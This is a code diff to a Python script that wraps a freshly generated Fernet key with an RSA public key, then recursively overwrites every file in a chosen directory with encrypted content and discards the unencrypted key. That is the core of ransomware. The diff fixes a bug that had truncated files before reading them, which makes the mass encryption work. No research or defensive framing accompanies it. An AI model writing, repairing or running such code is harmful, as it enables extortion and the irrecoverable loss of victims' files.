@@ -6,7 +6,7 @@ from pathlib import Path
 import sys
 
 public_key_path = sys.argv[1]
-encrypted_public_key_path = sys.argv[2]
+encrypted_symmetric_key_path = sys.argv[2]
 directory_path = sys.argv[3]
 
 symmetric_key = Fernet.generate_key()
@@ -20,7 +20,7 @@ with open(public_key_path, 'rb') as file:
     )
 
 # encrypt symmetric key used to encrypt files with a public key
-with open(encrypted_public_key_path, 'wb') as file:
+with open(encrypted_symmetric_key_path, 'wb') as file:
     file.write(
         public_key.encrypt(
             symmetric_key,
@@ -33,13 +33,15 @@ with open(encrypted_public_key_path, 'wb') as file:
     )
 
 """
-recursively encrypt all files in a given directory
-and delete the Fernet instance with unencrypted symmetric key
+recursively encrypt all files in a directory
+and delete the instance with unencrypted symmetric key
 """
 for item in Path(directory_path).rglob('*'):
     if item.is_file():
-        with open(item, 'w+b') as file:
-            file.write(
-                fernet.encrypt(file.read())
+        with open(item, 'rb') as file:
+            ciphertext = fernet.encrypt(
+                file.read()
             )
+        with open(item, 'wb') as file:
+            file.write(ciphertext)
 del fernet
